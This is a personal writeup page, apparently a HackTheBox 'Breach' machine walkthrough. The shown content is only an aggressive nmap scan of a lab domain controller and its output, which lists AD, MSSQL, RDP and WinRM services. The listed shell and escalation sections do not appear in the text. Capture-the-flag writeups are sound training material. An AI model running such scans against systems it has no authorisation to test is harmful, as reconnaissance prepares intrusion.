<!DOCTYPE html><html lang="en" class="no-js"><head>
    
      <meta charset="utf-8">
      <meta name="viewport" content="width=device-width,initial-scale=1">
      
      
      
        <link rel="canonical" href="https://syanide-.github.io/writeups/writeups/HackTheBox/Machines/Breach/">
      
      
        <link rel="prev" href="../../../../blog/">
      
      
        <link rel="next" href="../Rainbow/">
      
      
        <link rel="alternate" type="application/rss+xml" title="RSS feed" href="../../../../feed_rss_created.xml">
        <link rel="alternate" type="application/rss+xml" title="RSS feed of updated content" href="../../../../feed_rss_updated.xml">
      
      <link rel="icon" href="../../../../assets/images/favicon.png">
      <meta name="generator" content="mkdocs-1.6.1, mkdocs-material-9.6.22">
    
    
      
        <title>Breach - SYANiDE-.github.io writeups</title>
      
    
    
      <link rel="stylesheet" href="../../../../assets/stylesheets/main.84d31ad4.min.css">
      
        
        <link rel="stylesheet" href="../../../../assets/stylesheets/palette.06af60db.min.css">
      
      


    
    
      
    
    
      
        
        
        <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
        <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Roboto:300,300i,400,400i,700,700i%7CRoboto+Mono:400,400i,700,700i&amp;display=fallback">
        <style>:root{--md-text-font:"Roboto";--md-code-font:"Roboto Mono"}</style>
      
    
    
      <link rel="stylesheet" href="../../../../css/app.css">
    
      <link rel="stylesheet" href="../../../../css/terminal-player.css">
    
      <link rel="stylesheet" href="../../../../css/asciinema-player.css">
    
      <link rel="stylesheet" href="../../../../assets/stylesheets/panzoom.css">
    
    <script>__md_scope=new URL("../../../..",location),__md_hash=e=>[...e].reduce(((e,_)=>(e<<5)-e+_.charCodeAt(0)),0),__md_get=(e,_=localStorage,t=__md_scope)=>JSON.parse(_.getItem(t.pathname+"."+e)),__md_set=(e,_,t=localStorage,a=__md_scope)=>{try{t.setItem(a.pathname+"."+e,JSON.stringify(_))}catch(e){}}</script>
    
      

    
    
    
  <link href="../../../../assets/stylesheets/glightbox.min.css" rel="stylesheet"><script src="../../../../assets/javascripts/glightbox.min.js"></script><style id="glightbox-style">
            html.glightbox-open { overflow: initial; height: 100%; }
            .gslide-title { margin-top: 0px; user-select: text; }
            .gslide-desc { color: #666; user-select: text; }
            .gslide-image img { background: white; }
            .gscrollbar-fixer { padding-right: 15px; }
            .gdesc-inner { font-size: 0.75rem; }
            body[data-md-color-scheme="slate"] .gdesc-inner { background: var(--md-default-bg-color); }
            body[data-md-color-scheme="slate"] .gslide-title { color: var(--md-default-fg-color); }
            body[data-md-color-scheme="slate"] .gslide-desc { color: var(--md-default-fg-color); }
        </style><meta name="panzoom-theme" content="material">
<meta name="panzoom-data" content='{"selectors": [".d2", ".mermaid"], "initial_zoom_level": 1.0}'> </head>
  
  
    
    
      
    
    
    
    
    <body dir="ltr" data-md-color-scheme="default" data-md-color-primary="black" data-md-color-accent="deep-orange">
  
    
    <input class="md-toggle" data-md-toggle="drawer" type="checkbox" id="__drawer" autocomplete="off">
    <input class="md-toggle" data-md-toggle="search" type="checkbox" id="__search" autocomplete="off">
    <label class="md-overlay" for="__drawer"></label>
    <div data-md-component="skip">
      
        
        <a href="#enumeration" class="md-skip">
          Skip to content
        </a>
      
    </div>
    <div data-md-component="announce">
      
    </div>
    
    
      

  

<header class="md-header md-header--shadow md-header--lifted" data-md-component="header">
  <nav class="md-header__inner md-grid" aria-label="Header">
    <a href="../../../.." title="SYANiDE-.github.io writeups" class="md-header__button md-logo" aria-label="SYANiDE-.github.io writeups" data-md-component="logo">
      
  
  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 8a3 3 0 0 0 3-3 3 3 0 0 0-3-3 3 3 0 0 0-3 3 3 3 0 0 0 3 3m0 3.54C9.64 9.35 6.5 8 3 8v11c3.5 0 6.64 1.35 9 3.54 2.36-2.19 5.5-3.54 9-3.54V8c-3.5 0-6.64 1.35-9 3.54"></path></svg>

    </a>
    <label class="md-header__button md-icon" for="__drawer">
      
      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M3 6h18v2H3zm0 5h18v2H3zm0 5h18v2H3z"></path></svg>
    </label>
    <div class="md-header__title" data-md-component="header-title">
      <div class="md-header__ellipsis">
        <div class="md-header__topic">
          <span class="md-ellipsis">
            SYANiDE-.github.io writeups
          </span>
        </div>
        <div class="md-header__topic" data-md-component="header-topic">
          <span class="md-ellipsis">
            
              Breach
            
          </span>
        </div>
      </div>
    </div>
    
      
        <form class="md-header__option" data-md-component="palette">
  
    
    
    
    <input class="md-option" data-md-color-media="(prefers-color-scheme: light)" data-md-color-scheme="default" data-md-color-primary="black" data-md-color-accent="deep-orange" aria-label="Switch to dark mode" type="radio" name="__palette" id="__palette_0">
    
      <label class="md-header__button md-icon" title="Switch to dark mode" for="__palette_1" hidden>
        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 2a7 7 0 0 0-7 7c0 2.38 1.19 4.47 3 5.74V17a1 1 0 0 0 1 1h6a1 1 0 0 0 1-1v-2.26c1.81-1.27 3-3.36 3-5.74a7 7 0 0 0-7-7M9 21a1 1 0 0 0 1 1h4a1 1 0 0 0 1-1v-1H9z"></path></svg>
      </label>
    
  
    
    
    
    <input class="md-option" data-md-color-media="(prefers-color-scheme: dark)" data-md-color-scheme="slate" data-md-color-primary="black" data-md-color-accent="deep-orange" aria-label="Switch to light mode" type="radio" name="__palette" id="__palette_1">
    
      <label class="md-header__button md-icon" title="Switch to light mode" for="__palette_0" hidden>
        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 2a7 7 0 0 1 7 7c0 2.38-1.19 4.47-3 5.74V17a1 1 0 0 1-1 1H9a1 1 0 0 1-1-1v-2.26C6.19 13.47 5 11.38 5 9a7 7 0 0 1 7-7M9 21v-1h6v1a1 1 0 0 1-1 1h-4a1 1 0 0 1-1-1m3-17a5 5 0 0 0-5 5c0 2.05 1.23 3.81 3 4.58V16h4v-2.42c1.77-.77 3-2.53 3-4.58a5 5 0 0 0-5-5"></path></svg>
      </label>
    
  
</form>
      
    
    
      <script>var palette=__md_get("__palette");if(palette&&palette.color){if("(prefers-color-scheme)"===palette.color.media){var media=matchMedia("(prefers-color-scheme: light)"),input=document.querySelector(media.matches?"[data-md-color-media='(prefers-color-scheme: light)']":"[data-md-color-media='(prefers-color-scheme: dark)']");palette.color.media=input.getAttribute("data-md-color-media"),palette.color.scheme=input.getAttribute("data-md-color-scheme"),palette.color.primary=input.getAttribute("data-md-color-primary"),palette.color.accent=input.getAttribute("data-md-color-accent")}for(var[key,value]of Object.entries(palette.color))document.body.setAttribute("data-md-color-"+key,value)}</script>
    
    
    
      
      
        <label class="md-header__button md-icon" for="__search">
          
          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.52 6.52 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5"></path></svg>
        </label>
        <div class="md-search" data-md-component="search" role="dialog">
  <label class="md-search__overlay" for="__search"></label>
  <div class="md-search__inner" role="search">
    <form class="md-search__form" name="search">
      <input type="text" class="md-search__input" name="query" aria-label="Search" placeholder="Search" autocapitalize="off" autocorrect="off" autocomplete="off" spellcheck="false" data-md-component="search-query" required>
      <label class="md-search__icon md-icon" for="__search">
        
        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.52 6.52 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5"></path></svg>
        
        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M20 11v2H8l5.5 5.5-1.42 1.42L4.16 12l7.92-7.92L13.5 5.5 8 11z"></path></svg>
      </label>
      <nav class="md-search__options" aria-label="Search">
        
          <a href="javascript:void(0)" class="md-search__icon md-icon" title="Share" aria-label="Share" data-clipboard data-clipboard-text="" data-md-component="search-share" tabindex="-1">
            
            <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M18 16.08c-.76 0-1.44.3-1.96.77L8.91 12.7c.05-.23.09-.46.09-.7s-.04-.47-.09-.7l7.05-4.11c.54.5 1.25.81 2.04.81a3 3 0 0 0 3-3 3 3 0 0 0-3-3 3 3 0 0 0-3 3c0 .24.04.47.09.7L8.04 9.81C7.5 9.31 6.79 9 6 9a3 3 0 0 0-3 3 3 3 0 0 0 3 3c.79 0 1.5-.31 2.04-.81l7.12 4.15c-.05.21-.08.43-.08.66 0 1.61 1.31 2.91 2.92 2.91s2.92-1.3 2.92-2.91A2.92 2.92 0 0 0 18 16.08"></path></svg>
          </a>
        
        <button type="reset" class="md-search__icon md-icon" title="Clear" aria-label="Clear" tabindex="-1">
          
          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M19 6.41 17.59 5 12 10.59 6.41 5 5 6.41 10.59 12 5 17.59 6.41 19 12 13.41 17.59 19 19 17.59 13.41 12z"></path></svg>
        </button>
      </nav>
      
    </form>
    <div class="md-search__output">
      <div class="md-search__scrollwrap" tabindex="0" data-md-scrollfix>
        <div class="md-search-result" data-md-component="search-result">
          <div class="md-search-result__meta">
            Initializing search
          </div>
          <ol class="md-search-result__list" role="presentation"></ol>
        </div>
      </div>
    </div>
  </div>
</div>
      
    
    
  </nav>
  
    
      
<nav class="md-tabs" aria-label="Tabs" data-md-component="tabs">
  <div class="md-grid">
    <ul class="md-tabs__list">
      
        
  
  
  
  
    <li class="md-tabs__item">
      <a href="../../../.." class="md-tabs__link">
        
  
  
    
  
  About

      </a>
    </li>
  

      
        
  
  
  
  
    
    
      <li class="md-tabs__item">
        <a href="../../../../blog/" class="md-tabs__link">
          
  
  
    
  
  Blog

        </a>
      </li>
    
  

      
        
  
  
  
    
  
  
    
    
      
  
  
  
    
  
  
    
    
      
  
  
  
    
  
  
    
    
      <li class="md-tabs__item md-tabs__item--active">
        <a href="./" class="md-tabs__link">
          
  
  
    
  
  Writeups

        </a>
      </li>
    
  

    
  

    
  

      
    </ul>
  </div>
</nav>
    
  
</header>
    
    <div class="md-container" data-md-component="container">
      
      
        
      
      <main class="md-main" data-md-component="main">
        <div class="md-main__inner md-grid">
          
            
              
              <div class="md-sidebar md-sidebar--primary" data-md-component="sidebar" data-md-type="navigation">
                <div class="md-sidebar__scrollwrap">
                  <div class="md-sidebar__inner">
                    


  


  

<nav class="md-nav md-nav--primary md-nav--lifted md-nav--integrated" aria-label="Navigation" data-md-level="0">
  <label class="md-nav__title" for="__drawer">
    <a href="../../../.." title="SYANiDE-.github.io writeups" class="md-nav__button md-logo" aria-label="SYANiDE-.github.io writeups" data-md-component="logo">
      
  
  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 8a3 3 0 0 0 3-3 3 3 0 0 0-3-3 3 3 0 0 0-3 3 3 3 0 0 0 3 3m0 3.54C9.64 9.35 6.5 8 3 8v11c3.5 0 6.64 1.35 9 3.54 2.36-2.19 5.5-3.54 9-3.54V8c-3.5 0-6.64 1.35-9 3.54"></path></svg>

    </a>
    SYANiDE-.github.io writeups
  </label>
  
  <ul class="md-nav__list" data-md-scrollfix>
    
      
      
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../.." class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    About
    
  </span>
  

      </a>
    </li>
  

    
      
      
  
  
  
  
    
    
      
        
          
        
      
        
      
    
    
    
      
      
    
    
      
        
        
      
    
    <li class="md-nav__item md-nav__item--pruned md-nav__item--nested">
      
        
  
  
  
    <a href="../../../../blog/" class="md-nav__link">
      
  
  
  <span class="md-ellipsis">
    Blog
    
  </span>
  

      
        <span class="md-nav__icon md-icon"></span>
      
    </a>
  

      
    </li>
  

    
      
      
  
  
    
  
  
  
    
    
      
        
      
    
    
    
      
        
        
      
      
    
    
      
    
    <li class="md-nav__item md-nav__item--active md-nav__item--section md-nav__item--nested">
      
        
        
        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_3" checked>
        
          
          <label class="md-nav__link" for="__nav_3" id="__nav_3_label" tabindex="">
            
  
  
  <span class="md-ellipsis">
    Writeups
    
  </span>
  

            <span class="md-nav__icon md-icon"></span>
          </label>
        
        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_3_label" aria-expanded="true">
          <label class="md-nav__title" for="__nav_3">
            <span class="md-nav__icon md-icon"></span>
            Writeups
          </label>
          <ul class="md-nav__list" data-md-scrollfix>
            
              
                
  
  
    
  
  
  
    
    
      
        
      
    
    
    
      
      
    
    
      
    
    <li class="md-nav__item md-nav__item--active md-nav__item--nested">
      
        
        
        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_3_1" checked>
        
          
          <label class="md-nav__link" for="__nav_3_1" id="__nav_3_1_label" tabindex="0">
            
  
  
  <span class="md-ellipsis">
    HackTheBox
    
  </span>
  

            <span class="md-nav__icon md-icon"></span>
          </label>
        
        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_3_1_label" aria-expanded="true">
          <label class="md-nav__title" for="__nav_3_1">
            <span class="md-nav__icon md-icon"></span>
            HackTheBox
          </label>
          <ul class="md-nav__list" data-md-scrollfix>
            
              
                
  
  
    
  
  
  
    
    
      
        
      
        
      
    
    
    
      
      
    
    
      
    
    <li class="md-nav__item md-nav__item--active md-nav__item--nested">
      
        
        
        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_3_1_1" checked>
        
          
          <label class="md-nav__link" for="__nav_3_1_1" id="__nav_3_1_1_label" tabindex="0">
            
  
  
  <span class="md-ellipsis">
    Machines
    
  </span>
  

            <span class="md-nav__icon md-icon"></span>
          </label>
        
        <nav class="md-nav" data-md-level="3" aria-labelledby="__nav_3_1_1_label" aria-expanded="true">
          <label class="md-nav__title" for="__nav_3_1_1">
            <span class="md-nav__icon md-icon"></span>
            Machines
          </label>
          <ul class="md-nav__list" data-md-scrollfix>
            
              
                
  
  
    
  
  
  
    <li class="md-nav__item md-nav__item--active">
      
      <input class="md-nav__toggle md-toggle" type="checkbox" id="__toc">
      
      
      
        <label class="md-nav__link md-nav__link--active" for="__toc">
          
  
  
  <span class="md-ellipsis">
    Breach
    
  </span>
  

          <span class="md-nav__icon md-icon"></span>
        </label>
      
      <a href="./" class="md-nav__link md-nav__link--active">
        
  
  
  <span class="md-ellipsis">
    Breach
    
  </span>
  

      </a>
      
        

<nav class="md-nav md-nav--secondary" aria-label="Table of contents">
  
  
  
  
    <label class="md-nav__title" for="__toc">
      <span class="md-nav__icon md-icon"></span>
      Table of contents
    </label>
    <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
      
        <li class="md-nav__item">
  <a href="#enumeration" class="md-nav__link">
    <span class="md-ellipsis">
      enumeration
    </span>
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#what-can-juliawong-do" class="md-nav__link">
    <span class="md-ellipsis">
      What can julia.wong do
    </span>
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#get-a-shell" class="md-nav__link">
    <span class="md-ellipsis">
      Get a shell
    </span>
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#escalate" class="md-nav__link">
    <span class="md-ellipsis">
      Escalate
    </span>
  </a>
  
</li>
      
    </ul>
  
</nav>
      
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../Rainbow/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    Rainbow
    
  </span>
  

      </a>
    </li>
  

              
            
          </ul>
        </nav>
      
    </li>
  

              
            
          </ul>
        </nav>
      
    </li>
  

              
            
          </ul>
        </nav>
      
    </li>
  

    
  </ul>
</nav>
                  </div>
                </div>
              </div>
            
            
          
          
            <div class="md-content" data-md-component="content">
              <article class="md-content__inner md-typeset">
                
                  



  <h1>Breach</h1>

<p><a class="glightbox" data-type="image" data-width="100%" data-height="auto" href="../../../../Pasted_image_20251029221058.png" data-desc-position="bottom"><img alt="Pasted_image_20251029221058.png" src="../../../../Pasted_image_20251029221058.png"></a></p>
<p>Nmap scan of the target host
</p><div class="highlight"><pre><span></span><code>┌──<span class="o">(</span>notroot㉿elysium<span class="o">)</span>-<span class="o">[(</span>master<span class="o">)</span><span class="w"> </span><span class="m">1</span><span class="w"> </span>~/htb<span class="o">]</span>
└─$<span class="w"> </span>nmap<span class="w"> </span>-A<span class="w"> </span>-Pn<span class="w"> </span><span class="m">10</span>.129.38.236
Starting<span class="w"> </span>Nmap<span class="w"> </span><span class="m">7</span>.95<span class="w"> </span><span class="o">(</span><span class="w"> </span>https://nmap.org<span class="w"> </span><span class="o">)</span><span class="w"> </span>at<span class="w"> </span><span class="m">2025</span>-10-24<span class="w"> </span><span class="m">22</span>:54<span class="w"> </span>PDT
Nmap<span class="w"> </span>scan<span class="w"> </span>report<span class="w"> </span><span class="k">for</span><span class="w"> </span><span class="m">10</span>.129.38.236
Host<span class="w"> </span>is<span class="w"> </span>up<span class="w"> </span><span class="o">(</span><span class="m">0</span>.10s<span class="w"> </span>latency<span class="o">)</span>.
Not<span class="w"> </span>shown:<span class="w"> </span><span class="m">986</span><span class="w"> </span>filtered<span class="w"> </span>tcp<span class="w"> </span>ports<span class="w"> </span><span class="o">(</span>no-response<span class="o">)</span>
PORT<span class="w">     </span>STATE<span class="w"> </span>SERVICE<span class="w">       </span>VERSION
<span class="m">53</span>/tcp<span class="w">   </span>open<span class="w">  </span>domain<span class="w">        </span>Simple<span class="w"> </span>DNS<span class="w"> </span>Plus
<span class="m">80</span>/tcp<span class="w">   </span>open<span class="w">  </span>http<span class="w">          </span>Microsoft<span class="w"> </span>IIS<span class="w"> </span>httpd<span class="w"> </span><span class="m">10</span>.0
<span class="p">|</span>_http-title:<span class="w"> </span>IIS<span class="w"> </span>Windows<span class="w"> </span>Server
<span class="p">|</span><span class="w"> </span>http-methods:<span class="w"> </span>
<span class="p">|</span>_<span class="w">  </span>Potentially<span class="w"> </span>risky<span class="w"> </span>methods:<span class="w"> </span>TRACE
<span class="p">|</span>_http-server-header:<span class="w"> </span>Microsoft-IIS/10.0
<span class="m">88</span>/tcp<span class="w">   </span>open<span class="w">  </span>kerberos-sec<span class="w">  </span>Microsoft<span class="w"> </span>Windows<span class="w"> </span>Kerberos<span class="w"> </span><span class="o">(</span>server<span class="w"> </span>time:<span class="w"> </span><span class="m">2025</span>-10-25<span class="w"> </span><span class="m">05</span>:55:31Z<span class="o">)</span>
<span class="m">135</span>/tcp<span class="w">  </span>open<span class="w">  </span>msrpc<span class="w">         </span>Microsoft<span class="w"> </span>Windows<span class="w"> </span>RPC
<span class="m">139</span>/tcp<span class="w">  </span>open<span class="w">  </span>netbios-ssn<span class="w">   </span>Microsoft<span class="w"> </span>Windows<span class="w"> </span>netbios-ssn
<span class="m">389</span>/tcp<span class="w">  </span>open<span class="w">  </span>ldap<span class="w">          </span>Microsoft<span class="w"> </span>Windows<span class="w"> </span>Active<span class="w"> </span>Directory<span class="w"> </span>LDAP<span class="w"> </span><span class="o">(</span>Domain:<span class="w"> </span>breach.vl0.,<span class="w"> </span>Site:<span class="w"> </span>Default-First-Site-Name<span class="o">)</span>
<span class="m">445</span>/tcp<span class="w">  </span>open<span class="w">  </span>microsoft-ds?
<span class="m">464</span>/tcp<span class="w">  </span>open<span class="w">  </span>kpasswd5?
<span class="m">593</span>/tcp<span class="w">  </span>open<span class="w">  </span>ncacn_http<span class="w">    </span>Microsoft<span class="w"> </span>Windows<span class="w"> </span>RPC<span class="w"> </span>over<span class="w"> </span>HTTP<span class="w"> </span><span class="m">1</span>.0
<span class="m">636</span>/tcp<span class="w">  </span>open<span class="w">  </span>tcpwrapped
<span class="m">1433</span>/tcp<span class="w"> </span>open<span class="w">  </span>ms-sql-s<span class="w">      </span>Microsoft<span class="w"> </span>SQL<span class="w"> </span>Server<span class="w"> </span><span class="m">2019</span><span class="w"> </span><span class="m">15</span>.00.2000.00<span class="p">;</span><span class="w"> </span>RTM
<span class="p">|</span><span class="w"> </span>ms-sql-info:<span class="w"> </span>
<span class="p">|</span><span class="w">   </span><span class="m">10</span>.129.38.236:1433:<span class="w"> </span>
<span class="p">|</span><span class="w">     </span>Version:<span class="w"> </span>
<span class="p">|</span><span class="w">       </span>name:<span class="w"> </span>Microsoft<span class="w"> </span>SQL<span class="w"> </span>Server<span class="w"> </span><span class="m">2019</span><span class="w"> </span>RTM
<span class="p">|</span><span class="w">       </span>number:<span class="w"> </span><span class="m">15</span>.00.2000.00
<span class="p">|</span><span class="w">       </span>Product:<span class="w"> </span>Microsoft<span class="w"> </span>SQL<span class="w"> </span>Server<span class="w"> </span><span class="m">2019</span>
<span class="p">|</span><span class="w">       </span>Service<span class="w"> </span>pack<span class="w"> </span>level:<span class="w"> </span>RTM
<span class="p">|</span><span class="w">       </span>Post-SP<span class="w"> </span>patches<span class="w"> </span>applied:<span class="w"> </span><span class="nb">false</span>
<span class="p">|</span>_<span class="w">    </span>TCP<span class="w"> </span>port:<span class="w"> </span><span class="m">1433</span>
<span class="p">|</span><span class="w"> </span>ssl-cert:<span class="w"> </span>Subject:<span class="w"> </span><span class="nv">commonName</span><span class="o">=</span>SSL_Self_Signed_Fallback
<span class="p">|</span><span class="w"> </span>Not<span class="w"> </span>valid<span class="w"> </span>before:<span class="w"> </span><span class="m">2025</span>-10-25T05:56:19
<span class="p">|</span>_Not<span class="w"> </span>valid<span class="w"> </span>after:<span class="w">  </span><span class="m">2055</span>-10-25T05:56:19
<span class="p">|</span><span class="w"> </span>ms-sql-ntlm-info:<span class="w"> </span>
<span class="p">|</span><span class="w">   </span><span class="m">10</span>.129.38.236:1433:<span class="w"> </span>
<span class="p">|</span><span class="w">     </span>Target_Name:<span class="w"> </span>BREACH
<span class="p">|</span><span class="w">     </span>NetBIOS_Domain_Name:<span class="w"> </span>BREACH
<span class="p">|</span><span class="w">     </span>NetBIOS_Computer_Name:<span class="w"> </span>BREACHDC
<span class="p">|</span><span class="w">     </span>DNS_Domain_Name:<span class="w"> </span>breach.vl
<span class="p">|</span><span class="w">     </span>DNS_Computer_Name:<span class="w"> </span>BREACHDC.breach.vl
<span class="p">|</span><span class="w">     </span>DNS_Tree_Name:<span class="w"> </span>breach.vl
<span class="p">|</span>_<span class="w">    </span>Product_Version:<span class="w"> </span><span class="m">10</span>.0.20348
<span class="p">|</span>_ssl-date:<span class="w"> </span><span class="m">2025</span>-10-25T09:57:48+00:00<span class="p">;</span><span class="w"> </span>0s<span class="w"> </span>from<span class="w"> </span>scanner<span class="w"> </span>time.
<span class="m">3268</span>/tcp<span class="w"> </span>open<span class="w">  </span>ldap<span class="w">          </span>Microsoft<span class="w"> </span>Windows<span class="w"> </span>Active<span class="w"> </span>Directory<span class="w"> </span>LDAP<span class="w"> </span><span class="o">(</span>Domain:<span class="w"> </span>breach.vl0.,<span class="w"> </span>Site:<span class="w"> </span>Default-First-Site-Name<span class="o">)</span>
<span class="m">3269</span>/tcp<span class="w"> </span>open<span class="w">  </span>tcpwrapped
<span class="m">3389</span>/tcp<span class="w"> </span>open<span class="w">  </span>ms-wbt-server<span class="w"> </span>Microsoft<span class="w"> </span>Terminal<span class="w"> </span>Services
<span class="p">|</span><span class="w"> </span>rdp-ntlm-info:<span class="w"> </span>
<span class="p">|</span><span class="w">   </span>Target_Name:<span class="w"> </span>BREACH
<span class="p">|</span><span class="w">   </span>NetBIOS_Domain_Name:<span class="w"> </span>BREACH
<span class="p">|</span><span class="w">   </span>NetBIOS_Computer_Name:<span class="w"> </span>BREACHDC
<span class="p">|</span><span class="w">   </span>DNS_Domain_Name:<span class="w"> </span>breach.vl
<span class="p">|</span><span class="w">   </span>DNS_Computer_Name:<span class="w"> </span>BREACHDC.breach.vl
<span class="p">|</span><span class="w">   </span>Product_Version:<span class="w"> </span><span class="m">10</span>.0.20348
<span class="p">|</span>_<span class="w">  </span>System_Time:<span class="w"> </span><span class="m">2025</span>-10-25T05:55:48+00:00
<span class="p">|</span>_ssl-date:<span class="w"> </span><span class="m">2025</span>-10-25T05:56:27+00:00<span class="p">;</span><span class="w"> </span>0s<span class="w"> </span>from<span class="w"> </span>scanner<span class="w"> </span>time.
<span class="p">|</span><span class="w"> </span>ssl-cert:<span class="w"> </span>Subject:<span class="w"> </span><span class="nv">commonName</span><span class="o">=</span>BREACHDC.breach.vl
<span class="p">|</span><span class="w"> </span>Not<span class="w"> </span>valid<span class="w"> </span>before:<span class="w"> </span><span class="m">2025</span>-09-07T08:04:48
<span class="p">|</span>_Not<span class="w"> </span>valid<span class="w"> </span>after:<span class="w">  </span><span class="m">2026</span>-03-09T08:04:48
<span class="m">5985</span>/tcp<span class="w"> </span>open<span class="w">  </span>http<span class="w">          </span>Microsoft<span class="w"> </span>HTTPAPI<span class="w"> </span>httpd<span class="w"> </span><span class="m">2</span>.0<span class="w"> </span><span class="o">(</span>SSDP/UPnP<span class="o">)</span>
<span class="p">|</span>_http-server-header:<span class="w"> </span>Microsoft-HTTPAPI/2.0
<span class="p">|</span>_http-title:<span class="w"> </span>Not<span class="w"> </span>Found
Warning:<span class="w"> </span>OSScan<span class="w"> </span>results<span class="w"> </span>may<span class="w"> </span>be<span class="w"> </span>unreliable<span class="w"> </span>because<span class="w"> </span>we<span class="w"> </span>could<span class="w"> </span>not<span class="w"> </span>find<span class="w"> </span>at<span class="w"> </span>least<span class="w"> </span><span class="m">1</span><span class="w"> </span>open<span class="w"> </span>and<span class="w"> </span><span class="m">1</span><span class="w"> </span>closed<span class="w"> </span>port
Device<span class="w"> </span>type:<span class="w"> </span>general<span class="w"> </span>purpose
Running<span class="w"> </span><span class="o">(</span>JUST<span class="w"> </span>GUESSING<span class="o">)</span>:<span class="w"> </span>Microsoft<span class="w"> </span>Windows<span class="w"> </span><span class="m">2022</span><span class="p">|</span><span class="m">2012</span><span class="p">|</span><span class="m">2016</span><span class="w"> </span><span class="o">(</span><span class="m">89</span>%<span class="o">)</span>
OS<span class="w"> </span>CPE:<span class="w"> </span>cpe:/o:microsoft:windows_server_2022<span class="w"> </span>cpe:/o:microsoft:windows_server_2012:r2<span class="w"> </span>cpe:/o:microsoft:windows_server_2016
Aggressive<span class="w"> </span>OS<span class="w"> </span>guesses:<span class="w"> </span>Microsoft<span class="w"> </span>Windows<span class="w"> </span>Server<span class="w"> </span><span class="m">2022</span><span class="w"> </span><span class="o">(</span><span class="m">89</span>%<span class="o">)</span>,<span class="w"> </span>Microsoft<span class="w"> </span>Windows<span class="w"> </span>Server<span class="w"> </span><span class="m">2012</span><span class="w"> </span>R2<span class="w"> </span><span class="o">(</span><span class="m">85</span>%<span class="o">)</span>,<span class="w"> </span>Microsoft<span class="w"> </span>Windows<span class="w"> </span>Server<span class="w"> </span><span class="m">2016</span><span class="w"> </span><span class="o">(</span><span class="m">85</span>%<span class="o">)</span>
No<span class="w"> </span>exact<span class="w"> </span>OS<span class="w"> </span>matches<span class="w"> </span><span class="k">for</span><span class="w"> </span>host<span class="w"> </span><span class="o">(</span><span class="nb">test</span><span class="w"> </span>conditions<span class="w"> </span>non-ideal<span class="o">)</span>.
Network<span class="w"> </span>Distance:<span class="w"> </span><span class="m">2</span><span class="w"> </span>hops
Service<span class="w"> </span>Info:<span class="w"> </span>Host:<span class="w"> </span>BREACHDC<span class="p">;</span><span class="w"> </span>OS:<span class="w"> </span>Windows<span class="p">;</span><span class="w"> </span>CPE:<span class="w"> </span>cpe:/o:microsoft:windows

Host<span class="w"> </span>script<span class="w"> </span>results:
<span class="p">|</span><span class="w"> </span>smb2-security-mode:<span class="w"> </span>
<span class="p">|</span><span class="w">   </span><span class="m">3</span>:1:1:<span class="w"> </span>
<span class="p">|</span>_<span class="w">    </span>Message<span class="w"> </span>signing<span class="w"> </span>enabled<span class="w"> </span>and<span class="w"> </span>required
<span class="p">|</span><span class="w"> </span>smb2-time:<span class="w"> </span>
<span class="p">|</span><span class="w">   </span>date:<span class="w"> </span><span class="m">2025</span>-10-25T05:55:52
<span class="p">|</span>_<span class="w">  </span>start_date:<span class="w"> </span>N/A

TRACEROUTE<span class="w"> </span><span class="o">(</span>using<span class="w"> </span>port<span class="w"> </span><span class="m">53</span>/tcp<span class="o">)</span>
HOP<span class="w"> </span>RTT<span class="w">       </span>ADDRESS
<span class="m">1</span><span class="w">   </span><span class="m">105</span>.63<span class="w"> </span>ms<span class="w"> </span><span class="m">10</span>.10.14.1
<span class="m">2</span><span class="w">   </span><span class="m">105</span>.65<span class="w"> </span>ms<span class="w"> </span><span class="m">10</span>.129.38.236

OS<span class="w"> </span>and<span class="w"> </span>Service<span class="w"> </span>detection<span class="w"> </span>performed.<span class="w"> </span>Please<span class="w"> </span>report<span class="w"> </span>any<span class="w"> </span>incorrect<span class="w"> </span>results<span class="w"> </span>at<span class="w"> </span>https://nmap.org/submit/<span class="w"> </span>.
Nmap<span class="w"> </span><span class="k">done</span>:<span class="w"> </span><span class="m">1</span><span class="w"> </span>IP<span class="w"> </span>address<span class="w"> </span><span class="o">(</span><span class="m">1</span><span class="w"> </span>host<span class="w"> </span>up<span class="o">)</span><span class="w"> </span>scanned<span class="w"> </span><span class="k">in</span><span class="w"> </span><span class="m">106</span>.28<span class="w"> </span>seconds
</code></pre></div><p></p>
